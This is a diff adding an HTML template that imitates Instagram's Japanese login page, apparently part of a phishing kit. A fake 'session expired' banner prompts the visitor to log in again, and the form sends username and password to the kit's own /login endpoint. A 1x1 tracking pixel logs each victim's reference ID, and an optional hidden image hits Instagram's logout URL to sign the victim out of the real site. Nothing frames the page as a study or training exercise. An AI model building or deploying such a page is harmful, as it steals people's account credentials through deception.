@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+<link rel="stylesheet" href="/static/style.css">
+<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<img src="/open.gif?ref={{ ref or '' }}" width="1" height="1" alt="">
+
+{% if force_logout %}
+  <img class="logout" src="https://www.instagram.com/accounts/logout/" width="1" height="1" alt="">
+{% endif %}
+
+  <div class="banner">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="#1877f2"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+    <span>セッションの有効期限が切れました。もう一度ログインしてください。</span>
+  </div>
+
+  <div class="container">
+    <h1 class="logo">Instagram</h1>
+
+    <form method="POST" action="/login" id="ig-form">
+      <div class="field">
+        <input id="username" type="text" name="username" placeholder=" "
+               value="{{ username or '' }}" autocomplete="username" required>
+        <label for="username">電話番号、ユーザーネーム、またはメールアドレス</label>
+      </div>
+
+      <div class="field">
+        <input id="password" type="password" name="password" placeholder=" "
+               autocomplete="current-password" required>
+        <label for="password">パスワード</label>
+      </div>
+
+      {% if error %}<div class="error">{{ error }}</div>{% endif %}
+
+      <input type="hidden" name="ref" value="{{ ref or '' }}">
+
+      <button type="submit" id="submit-btn">ログイン</button>
+
+      <div class="or"><span>または</span></div>
+
+      <a class="fb-btn" target="_blank" rel="noopener"
+         href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DAToR43A0h4HVadHRRyLebgfU69yxHvuUhUpOn54yXryxxKDA0zQBislT_gVo5-EejIeXEoCDvanlJhDOzmSd4HBU1e1jD5Tgj-j76lfbK0k5RRug3ovazmwSzKDx9G3ksJqMrxftSGl26CCMmfv8bGtCKRd-bRPuUu77aeBLjbSw6D8J_jh0HFNQR_IrqbJuPw3-ZCQ3s4L7UxhHYhSCHlxz5sKCc0dw7DKLFu4FlA5bSLD51Xl_MCfGh5XyTpeE-wPvpaciPPO9MP1U55PR5KvN4A">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><path d="M22 12a10 10 0 1 0-11.6 9.9v-7H7.9V12h2.5V9.8c0-2.5 1.5-3.9 3.7-3.9 1.1 0 2.2.2 2.2.2v2.4h-1.2c-1.2 0-1.6.8-1.6 1.6V12h2.7l-.4 2.9h-2.3v7A10 10 0 0 0 22 12z"/></svg>
+        Facebookでログイン
+      </a>
+
+      <a class="forgot" target="_blank" rel="noopener"
+         href="https://www.instagram.com/accounts/password/reset/">パスワードをお忘れですか?</a>
+    </form>
+  </div>
+
+  <div class="signup">アカウントをお持ちでないですか? <a href="#">登録する</a></div>
+
+</body>
+</html>
